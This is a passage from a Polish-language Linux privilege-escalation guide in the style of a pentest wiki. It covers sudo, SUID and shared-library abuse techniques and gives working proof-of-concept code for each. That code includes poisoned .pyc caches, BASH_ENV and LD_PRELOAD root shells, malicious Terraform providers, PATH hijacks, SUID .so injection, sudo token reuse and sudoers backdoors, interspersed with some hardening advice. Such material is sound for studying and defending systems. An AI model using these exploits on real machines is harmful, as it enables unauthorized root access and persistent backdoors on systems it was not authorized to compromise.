  - Jeśli możesz **usunąć i utworzyć ponownie** buforowany plik, bo katalog jest zapisywalny, nadal możesz zastąpić plik `.pyc` należący do roota i niezapisywalny.
- Typowa ścieżka:
  - `sudo -l` pokazuje skrypt lub wrapper Python, który możesz uruchomić jako root.
  - Ten skrypt importuje lokalny moduł z `/opt/app/`, `/usr/local/lib/...` itd.
  - Katalog `__pycache__` importowanego modułu jest zapisywalny przez Twojego użytkownika lub wszystkich.

Szybkie rozpoznanie:

```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```

Jeśli możesz sprawdzić uprzywilejowany skrypt, zidentyfikuj importowane moduły i ścieżkę ich pamięci podręcznej:<sup>[[32]](#references)</sup>

```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```

Przebieg nadużycia:

1. Uruchom raz skrypt dozwolony przez sudo, aby Python utworzył prawidłowy plik cache, jeśli jeszcze nie istnieje.
2. Odczytaj pierwsze 16 bajtów z prawidłowego pliku `.pyc` i użyj ich ponownie w zatrutym pliku.
3. Skompiluj obiekt kodu z payloadem, użyj `marshal.dumps(...)`, usuń oryginalny plik cache i odtwórz go, łącząc oryginalny nagłówek ze złośliwym bytecode.
4. Ponownie uruchom skrypt dozwolony przez sudo, aby import wykonał payload jako root.

Ważne uwagi:

- Ponowne użycie oryginalnego nagłówka jest kluczowe, ponieważ Python sprawdza metadane cache względem pliku źródłowego, a nie to, czy treść bytecode rzeczywiście odpowiada źródłu.
- Jest to szczególnie przydatne, gdy plik źródłowy należy do roota i nie można go zapisywać, ale można zapisywać w zawierającym go katalogu `__pycache__`.
- `PYTHONDONTWRITEBYTECODE=1` i `python -B` zapobiegają zapisywaniu przez Pythona nowych plików `.pyc`; **nie** uniemożliwiają mu załadowania istniejącego, prawidłowego cache podmienionego przez atakującego. Kluczową granicą jest to, czy użytkownik o niższych uprawnieniach może podmienić cache, który uprzywilejowany import zaakceptuje. Przed załadowaniem zbuforowanego bytecode Python sprawdza metadane czasu modyfikacji/rozmiaru lub hash. Zobacz [dokumentację referencyjną importu w Pythonie](https://docs.python.org/3.12/reference/import.html#cached-bytecode-invalidation) oraz [dokumentację wiersza poleceń](https://docs.python.org/3.12/using/cmdline.html#envvar-PYTHONDONTWRITEBYTECODE).

Minimalny szablon proof-of-concept:

```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
    src = pathlib.Path(d) / "x.py"
    src.write_text(payload)
    code = compile(src.read_text(), str(src), "exec")
    pyc.unlink()
    pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```

Hardening:

- Upewnij się, że żaden katalog w uprzywilejowanej ścieżce importu Pythona nie jest zapisywalny przez użytkowników o niskich uprawnieniach, w tym `__pycache__`.
- Sprawdź właścicieli i uprawnienia katalogów pamięci podręcznej, w tym istniejących plików `.pyc`. Wyłączenie zapisu bytecode może ograniczyć tworzenie nowych plików pamięci podręcznej, ale nie zabezpiecza przed podmianą już istniejącego pliku.
- Traktuj zapisywalne lokalne moduły Pythona i zapisywalne katalogi pamięci podręcznej tak samo jak zapisywalne skrypty powłoki lub biblioteki współdzielone uruchamiane przez roota.

### BASH_ENV zachowany przez sudo env_keep → root shell

Jeśli sudoers zachowuje `BASH_ENV` (np. `Defaults env_keep+="ENV BASH_ENV"`), możesz wykorzystać zachowanie startowe Bash w trybie nieinteraktywnym, aby uruchomić dowolny kod jako root podczas wywoływania dozwolonego polecenia.<sup>[[24]](#references)</sup>

- Dlaczego to działa: W przypadku powłok nieinteraktywnych Bash odczytuje `$BASH_ENV` i wykonuje wskazany plik przed uruchomieniem skryptu docelowego. Wiele reguł sudo zezwala na uruchamianie skryptu lub wrappera powłoki. Jeśli `BASH_ENV` jest zachowany przez sudo, wskazany plik zostaje wykonany z uprawnieniami roota.<sup>[[23]](#references)</sup>

- Wymagania:
  - Reguła sudo, z której możesz skorzystać (dowolny cel, który nieinteraktywnie wywołuje `/bin/bash`, lub dowolny skrypt Bash).
  - `BASH_ENV` znajduje się w `env_keep` (sprawdź za pomocą `sudo -l`).

- PoC:

```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```

- Wzmacnianie zabezpieczeń:
  - Usuń `BASH_ENV` (i `ENV`) z `env_keep`, preferuj `env_reset`.
  - Unikaj wrapperów powłoki dla poleceń dozwolonych przez sudo; używaj minimalnych plików binarnych.
  - Rozważ logowanie I/O sudo i alertowanie, gdy używane są zachowane zmienne środowiskowe.

### Terraform przez sudo z zachowanym HOME (!env_reset)

Gdy sudo zezwala na uruchomienie Terraform jako bardziej uprzywilejowany użytkownik, `!env_reset` jest wskazówką, by sprawdzić, które zmienne środowiskowe faktycznie przetrwają działanie tej konkretnej reguły. Zanim uznasz zapisywalny przez wywołującego plik `.terraformrc` lub `terraform.rc` za aktywną konfigurację CLI, potwierdź efektywną wartość `HOME` lub `TF_CLI_CONFIG_FILE`. Wpis `provider_installation.dev_overrides` ma znaczenie tylko wtedy, gdy ustalone polecenie Terraform ładuje tego providera, a wywołujący może umieścić jego plik wykonywalny w wybranym katalogu.<sup>[[25]](#references)</sup>

- Skieruj wymaganego providera do zapisywalnego katalogu i umieść tam złośliwy plugin o nazwie odpowiadającej providerowi (np. `terraform-provider-examples`):

```hcl
# ~/.terraformrc
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/dev/shm"
  }
  direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```

Terraform nie przejdzie handshake wtyczki Go, ale przed zakończeniem uruchomi payload jako root, pozostawiając shell z SUID.

### Nadpisania TF_VAR + obejście walidacji symlinków

Zmienne Terraform można przekazać za pomocą zmiennych środowiskowych `TF_VAR_<name>`, jeśli dana reguła sudo je zachowuje. Odczyt źródła wskazanego przez symlink wymaga również providera, który podąża za linkiem i kopiuje chroniony wynik do lokalizacji dostępnej dla wywołującego. Zapis do docelowego symlinka wymaga osobno wpisu docelowego kontrolowanego przez wywołującego oraz uprzywilejowanego providera, który podąża za nim podczas zapisu; późniejsze uruchomienie zaplanowanego zadania to tylko jedna z możliwych konsekwencji. Przed testowaniem którejkolwiek z tych metod sprawdź dokładne uprawnienia sudo, odpowiednie pliki `.tf`, wybraną konfigurację CLI i właścicieli ścieżek za pomocą poleceń tylko do odczytu, takich jak `sudo -l`, `stat` i `readlink`. Słabe walidacje leksykalne, takie jak `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")`, nie rozwiązują symlinków:<sup>[[25]](#references)</sup>

```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```

Terraform rozwiązuje symlink i kopiuje rzeczywisty plik `/root/root.txt` do lokalizacji dostępnej do odczytu przez atakującego. Tę samą metodę można wykorzystać do **zapisu** w uprzywilejowanych lokalizacjach, tworząc wcześniej symlinki w lokalizacji docelowej (np. wskazujące ścieżkę docelową providera wewnątrz `/etc/cron.d/`).

### requiretty / !requiretty

W niektórych starszych dystrybucjach sudo może być skonfigurowane z opcją `requiretty`, która wymusza uruchamianie sudo wyłącznie z interaktywnego TTY. Jeśli ustawiono `!requiretty` (lub opcja ta nie jest obecna), sudo można uruchomić z kontekstów nieinteraktywnych, takich jak reverse shells, zadania cron lub skrypty.

```bash
Defaults !requiretty
```

Nie jest to samo w sobie bezpośrednia podatność, ale rozszerza zakres sytuacji, w których można nadużyć reguł sudo bez pełnego PTY.

### Sudo env_keep+=PATH / niebezpieczny secure_path → przejęcie PATH

Jeśli `sudo -l` pokazuje `env_keep+=PATH` lub `secure_path` zawierający katalogi zapisywalne przez atakującego (np. `/home/<user>/bin`), niekwalifikowane polecenie zewnętrzne wywoływane przez cel dozwolony przez sudo może zostać przesłonięte.<sup>[[3]](#references)</sup> Brak efektywnego `secure_path` również warto sprawdzić, **jeśli** środowisko sudo danego polecenia zachowuje `PATH` kontrolowany przez wywołującego; sam brak `secure_path` tego nie dowodzi. Odczytaj dozwolony skrypt bez uruchamiania go, a następnie zweryfikuj dokładną regułę RunAs i argumentów, efektywną ścieżkę wyszukiwania poleceń oraz wcześniejszy katalog zapisywalny i przeszukiwalny, zawierający nazwę polecenia. Uwierzytelnianie, `NOEXEC`, wbudowane polecenia powłoki i bezwzględne ścieżki do poleceń mogą zmienić rezultat.

- Wymagania: reguła sudo (często `NOPASSWD`) uruchamiająca skrypt lub plik binarny, który wywołuje polecenia bez bezwzględnych ścieżek (`free`, `df`, `ps` itd.), oraz zapisywalny wpis PATH wyszukiwany jako pierwszy.

```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```

### Omijanie ścieżek podczas wykonywania poleceń przez sudo
**Przeskocz**, aby odczytać inne pliki, lub użyj **symlinków**. Na przykład w pliku sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_

```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```

Jeśli użyty zostanie **wildcard** (\*), będzie to jeszcze łatwiejsze:

```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```

**Środki zaradcze**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Polecenie sudo/plik binarny SUID bez ścieżki do polecenia

Jeśli **uprawnienie sudo** przyznano dla pojedynczego polecenia **bez podania ścieżki**: _hacker10 ALL= (root) less_, można to wykorzystać, zmieniając zmienną PATH

```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```

Tej techniki można również użyć, jeśli plik binarny **suid** **wykonuje inne polecenie bez podania jego ścieżki (zawsze sprawdzaj zawartość podejrzanego pliku binarnego SUID za pomocą** _**strings**_**).**

[Przykłady payloadów do wykonania.](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### Plik binarny SUID ze ścieżką do polecenia

Jeśli plik binarny **suid** **wykonuje inne polecenie, podając jego ścieżkę**, możesz spróbować **wyeksportować funkcję** o nazwie takiej jak polecenie wywoływane przez plik suid.

Na przykład, jeśli plik binarny suid wywołuje _**/usr/sbin/service apache2 start**_, spróbuj utworzyć i wyeksportować funkcję:

```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```

Następnie, gdy wywołasz plik binarny SUID, ta funkcja zostanie wykonana

### Niestandardowe wrappery kopiujące SUID

Narzędzie SUID należące do roota, które przyjmuje ścieżki źródłowe i docelowe, może przekraczać dwie różne granice zaufania. Jeśli buduje polecenie powłoki na podstawie któregoś z argumentów (na przykład przekazuje skonstruowane polecenie `cp` do `system()`), metaznaki powłoki mogą uruchomić inne polecenie z jego efektywnymi uprawnieniami. Nawet jeśli wywołuje `cp` bezpiecznie, bez użycia powłoki, nieograniczona ścieżka docelowa może umożliwić dowolny uprzywilejowany zapis do plików takich jak `/etc/passwd`. Sprawdź obsługę argumentów przez wrapper, zachowanie efektywnego UID, ograniczenia dotyczące miejsca docelowego oraz to, czy kopiowany plik zachowuje zawartość kontrolowaną przez wywołującego; ogólny błąd `cp` ani sam bit SUID nie stanowią dowodu na żadną z tych możliwości. Przed ręcznymi testami pasywnie sprawdź plik binarny i jego uprawnienia.

### Skrypt z prawem zapisu uruchamiany przez wrapper SUID

Częsta błędna konfiguracja niestandardowej aplikacji polega na tym, że wrapper będący plikiem binarnym SUID, należący do roota, uruchamia skrypt, który użytkownicy o niskich uprawnieniach mogą modyfikować.

Typowy schemat:

```c
int main(void) {
    system("/bin/bash /usr/local/bin/backup.sh");
}
```

Jeśli `/usr/local/bin/backup.sh` jest zapisywalny, możesz dopisać polecenia payloadu, a następnie uruchomić wrapper SUID:

```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```

Szybkie kontrole:

```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```

Ta ścieżka ataku jest szczególnie częsta w wrapperach „maintenance”/„backup” dostarczanych w `/usr/local/bin`.

### LD_PRELOAD i **LD_LIBRARY_PATH**

Zmienna środowiskowa **LD_PRELOAD** służy do wskazania jednej lub kilku bibliotek współdzielonych (plików .so), które loader ma załadować przed wszystkimi pozostałymi bibliotekami, w tym standardową biblioteką C (`libc.so`). Ten proces jest znany jako preloading biblioteki.

Aby jednak zachować bezpieczeństwo systemu i zapobiec wykorzystaniu tej funkcji, szczególnie w przypadku plików wykonywalnych **suid/sgid**, system wymusza określone warunki:

- Loader ignoruje **LD_PRELOAD** w przypadku plików wykonywalnych, dla których rzeczywisty identyfikator użytkownika (_ruid_) nie jest zgodny z efektywnym identyfikatorem użytkownika (_euid_).
- W przypadku plików wykonywalnych z suid/sgid preloadingowi podlegają tylko biblioteki ze standardowych ścieżek, które również mają ustawione suid/sgid.

Eskalacja uprawnień może nastąpić, jeśli masz możliwość wykonywania poleceń za pomocą `sudo`, a wynik `sudo -l` zawiera wpis **env_keep+=LD_PRELOAD**. Ta konfiguracja pozwala zachować zmienną środowiskową **LD_PRELOAD** i rozpoznać ją nawet podczas uruchamiania poleceń za pomocą `sudo`, co może prowadzić do wykonania dowolnego kodu z podwyższonymi uprawnieniami.<sup>[[9]](#references)</sup>

```
Defaults        env_keep += LD_PRELOAD
```

Zapisz jako **/tmp/pe.c**

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Następnie **skompiluj go** za pomocą:

```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

Na koniec **eskaluj uprawnienia**, uruchamiając

```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```

> [!CAUTION]
> Podobny privesc można wykorzystać, jeśli atakujący kontroluje zmienną środowiskową **LD_LIBRARY_PATH**, ponieważ kontroluje ścieżkę, w której będą wyszukiwane biblioteki.

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```

### SUID Binary – .so injection

W przypadku napotkania pliku binarnego z uprawnieniami **SUID**, który wydaje się nietypowy, warto sprawdzić, czy prawidłowo ładuje pliki **.so**. Można to sprawdzić, uruchamiając następujące polecenie:<sup>[[17]](#references)</sup>

```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```

Na przykład napotkanie błędu takiego jak _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ wskazuje na możliwość wykorzystania tej sytuacji.

Aby to wykorzystać, należy utworzyć plik C, na przykład _"/path/to/.config/libcalc.c"_, zawierający następujący kod:

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

Ten kod, po skompilowaniu i uruchomieniu, ma na celu podniesienie uprawnień przez manipulowanie uprawnieniami plików i uruchomienie powłoki z podwyższonymi uprawnieniami.

Skompiluj powyższy plik C do pliku shared object (.so) za pomocą:

```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```

Na koniec uruchomienie podatnego pliku binarnego SUID powinno wywołać exploit, potencjalnie umożliwiając przejęcie systemu.

## Shared Object Hijacking

```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

Teraz, gdy znaleźliśmy plik binarny SUID ładujący bibliotekę z folderu, do którego możemy zapisywać, utwórzmy w tym folderze bibliotekę o wymaganej nazwie:

```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

Jeśli pojawi się błąd taki jak

```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```

to oznacza, że wygenerowana przez Ciebie biblioteka musi zawierać funkcję o nazwie `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) to wyselekcjonowana lista plików binarnych systemu Unix, które atakujący może wykorzystać do obejścia lokalnych ograniczeń bezpieczeństwa. [**GTFOArgs**](https://gtfoargs.github.io/) to podobna lista, ale dotyczy przypadków, w których możesz **wstrzykiwać tylko argumenty** do polecenia.

Projekt gromadzi legalne funkcje plików binarnych systemu Unix, które można wykorzystać do ucieczki z ograniczonych powłok, eskalacji lub utrzymania podwyższonych uprawnień, przesyłania plików, uruchamiania powłok bind i reverse oraz ułatwiania innych zadań post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Jeśli masz dostęp do `sudo -l`, możesz użyć narzędzia [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo), aby sprawdzić, czy znajdzie sposób na wykorzystanie którejś z reguł sudo.

### Ponowne użycie tokenów Sudo

Jeśli masz **dostęp do sudo**, ale nie znasz hasła, możesz eskalować uprawnienia, **czekając na wykonanie polecenia sudo, a następnie przejmując token sesji**.<sup>[[18]](#references)</sup>

Wymagania dotyczące eskalacji uprawnień:

- Masz już powłokę jako użytkownik "_sampleuser_"
- Użytkownik "_sampleuser_" **użył `sudo`** do wykonania czegoś w ciągu **ostatnich 15 minut** (domyślnie tyle trwa token sudo, który pozwala używać `sudo` bez podawania hasła)
- `cat /proc/sys/kernel/yama/ptrace_scope` zwraca 0
- `gdb` jest dostępne (możesz je przesłać)

(`ptrace_scope` możesz tymczasowo włączyć za pomocą `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` lub na stałe, modyfikując `/etc/sysctl.d/10-ptrace.conf` i ustawiając `kernel.yama.ptrace_scope = 0`)

Jeśli wszystkie te wymagania są spełnione, **możesz eskalować uprawnienia za pomocą:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **Pierwszy exploit** (`exploit.sh`) utworzy plik binarny `activate_sudo_token` w _/tmp_. Możesz go użyć, aby **aktywować token sudo w swojej sesji** (automatycznie nie uzyskasz powłoki roota, wykonaj `sudo su`):

```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```

- **Drugi exploit** (`exploit_v2.sh`) utworzy powłokę sh w _/tmp_, **należącą do roota i z ustawionym setuid**

```bash
bash exploit_v2.sh
/tmp/sh -p
```

- **Trzeci exploit** (`exploit_v3.sh`) **utworzy plik sudoers**, który sprawi, że **tokeny sudo będą bezterminowe i wszyscy użytkownicy będą mogli używać sudo**.

```bash
bash exploit_v3.sh
sudo su
```

### /var/run/sudo/ts/\<Username>

Jeśli masz **uprawnienia do zapisu** w folderze lub w którymkolwiek z utworzonych w nim plików, możesz użyć pliku binarnego [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools), aby **utworzyć token sudo dla użytkownika i PID**.\
Na przykład, jeśli możesz nadpisać plik _/var/run/sudo/ts/sampleuser_ i masz powłokę tego użytkownika z PID 1234, możesz **uzyskać uprawnienia sudo** bez znajomości hasła, wykonując:

```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```

### /etc/sudoers, /etc/sudoers.d

Plik `/etc/sudoers` i pliki w katalogu `/etc/sudoers.d` określają, kto może używać `sudo` i w jaki sposób. Domyślnie **te pliki mogą być odczytywane wyłącznie przez użytkownika root i grupę root**.\
**Jeśli** możesz **odczytać** ten plik, możesz **uzyskać interesujące informacje**, a jeśli możesz **zapisywać** w dowolnym pliku, będziesz w stanie **eskalować uprawnienia**.

```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```

Jeśli masz uprawnienia do zapisu, możesz je wykorzystać do nadużyć.

```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```

Inny sposób nadużycia tych uprawnień:

```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```

### DOAS

Istnieją alternatywy dla pliku binarnego `sudo`, takie jak `doas` w OpenBSD. Pamiętaj, aby sprawdzić jego konfigurację w `/etc/doas.conf`

```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```

Jeśli `doas` zezwala na użycie edytora lub interpretera, sprawdź sposoby ucieczki w stylu GTFOBins:

```bash
doas vim
:!/bin/sh
```

Reguła `doas` umożliwiająca uruchomienie polecenia jako root w przypadku oryginalnego, opartego na Pythonie programu `dstat` również uzasadnia sprawdzenie ścieżek pluginów. Jego [podręcznik](https://github.com/dstat-real/dstat/blob/master/docs/dstat.1) i [kod źródłowy](https://github.com/dstat-real/dstat/blob/master/dstat) wymieniają `/usr/share/dstat/` i `/usr/local/share/dstat/` jako lokalizacje pluginów `dstat_*.py`. Jeśli bieżący użytkownik może zapisywać w lokalizacji faktycznie używanej przez zainstalowaną wersję i przeszukiwać ją, wybrany plugin może zostać uruchomiony z tożsamością RunAs `doas`. Sprawdź efektywną regułę, ścieżki wyszukiwania pluginów w danej wersji, uprawnienia katalogu i katalogów nadrzędnych lub ACL oraz to, czy wywołujący może wybrać plugin; sama reguła `dstat` lub zapisywalny katalog to jedynie trop. Inne implementacje `dstat` mogą korzystać z innych systemów pluginów. Sprawdzaj metadane pasywnie, nie ładując pluginu.

### Sudo Hijacking

Jeśli wiesz, że **użytkownik zwykle łączy się z maszyną i używa `sudo`** do eskalacji uprawnień, a ty uzyskałeś powłokę w kontekście tego użytkownika, możesz **utworzyć nowy plik wykonywalny sudo**, który uruchomi twój kod jako root, a następnie polecenie użytkownika. Potem **zmień $PATH** w kontekście użytkownika (na przykład dodając nową ścieżkę w `.bash_profile`), aby po uruchomieniu przez użytkownika `sudo` został wykonany twój plik wykonywalny sudo.

Pamiętaj, że jeśli użytkownik korzysta z innej powłoki (nie z bash), trzeba zmodyfikować inne pliki, aby dodać nową ścieżkę. Na przykład [sudo-piggyback](https://github.com/APTy/sudo-piggyback) modyfikuje `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Inny przykład znajdziesz w [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Albo uruchamiając coś w rodzaju:

```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```

## Biblioteka współdzielona

### ld.so

Plik `/etc/ld.so.conf` wskazuje, **skąd pochodzą wczytywane pliki konfiguracyjne**. Zazwyczaj zawiera następującą ścieżkę: `include /etc/ld.so.conf.d/*.conf`

Oznacza to, że zostaną wczytane pliki konfiguracyjne z `/etc/ld.so.conf.d/*.conf`. Te pliki konfiguracyjne **wskazują inne katalogi**, w których będą **wyszukiwane** **biblioteki**. Na przykład plik `/etc/ld.so.conf.d/libc.conf` zawiera `/usr/local/lib`. **Oznacza to, że system będzie szukał bibliotek w katalogu `/usr/local/lib`**.

Jeśli z jakiegoś powodu **użytkownik ma uprawnienia do zapisu** w którejkolwiek ze wskazanych ścieżek: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, dowolnym pliku w `/etc/ld.so.conf.d/` lub dowolnym katalogu wskazanym w pliku konfiguracyjnym z `/etc/ld.so.conf.d/*.conf`, może być w stanie eskalować uprawnienia.\
Zobacz, **jak wykorzystać tę błędną konfigurację** na stronie:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH

```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x0068c000)
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x005bb000)
```

Po skopiowaniu biblioteki do `/var/tmp/flag15/` program użyje jej z tej lokalizacji, zgodnie z wartością zmiennej `RPATH`.

```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x005b0000)
 libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x00737000)
```

Następnie utwórz złośliwą bibliotekę w `/var/tmp` za pomocą `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`

```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
 char *file = SHELL;
 char *argv[] = {SHELL,0};
 setresuid(geteuid(),geteuid(), geteuid());
 execve(file,argv,0);
}
```

## Możliwości

Linux capabilities zapewniają **procesowi podzbiór dostępnych uprawnień roota**. W efekcie **uprawnienia roota zostają podzielone na mniejsze, odrębne jednostki**. Każdą z tych jednostek można następnie niezależnie przyznać procesom. Dzięki temu pełny zestaw uprawnień zostaje ograniczony, co zmniejsza ryzyko wykorzystania luk.\
Przeczytaj poniższą stronę, aby **dowiedzieć się więcej o capabilities i sposobach ich nadużywania**:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Uprawnienia katalogów

W katalogu **bit „execute”** oznacza, że dany użytkownik może przejść do niego za pomocą polecenia „**cd**”.\
Bit **„read”** oznacza, że użytkownik może **wyświetlać** **pliki**, a bit **„write”** oznacza, że może **usuwać** i **tworzyć** nowe **pliki**.

## ACLs

Access Control Lists (ACLs) to dodatkowa warstwa uprawnień uznaniowych, która może **zastępować tradycyjne uprawnienia ugo/rwx**. Uprawnienia te zwiększają kontrolę nad dostępem do plików i katalogów, umożliwiając przyznawanie lub odmawianie praw konkretnym użytkownikom, którzy nie są właścicielami ani członkami danej grupy. Ten poziom **szczegółowości pozwala precyzyjniej zarządzać dostępem**. Więcej informacji można znaleźć [**tutaj**](https://linuxconfig.org/how-to-manage-acls-on-linux).<sup>[[19]](#references)</sup>

**Przyznaj** użytkownikowi „kali” uprawnienia do odczytu i zapisu pliku:

```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```

**Wyszukaj w systemie pliki z określonymi ACL:**

```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```

### Ukryte backdoor ACL w plikach dołączanych do sudoers

Częstą błędną konfiguracją jest należący do roota plik w `/etc/sudoers.d/` z uprawnieniami `440`, który mimo to zapewnia użytkownikowi o niskich uprawnieniach dostęp do zapisu za pośrednictwem ACL.

```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```

Jeśli widzisz coś takiego jak `user:alice:rw-`, użytkownik może dodać regułę sudo mimo restrykcyjnych bitów uprawnień:

```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```

To ścieżka utrwalania dostępu/escalacji uprawnień oparta na ACL o dużym wpływie, ponieważ łatwo ją przeoczyć podczas przeglądu ograniczonego do `ls -l`.

## Otwarte sesje powłoki

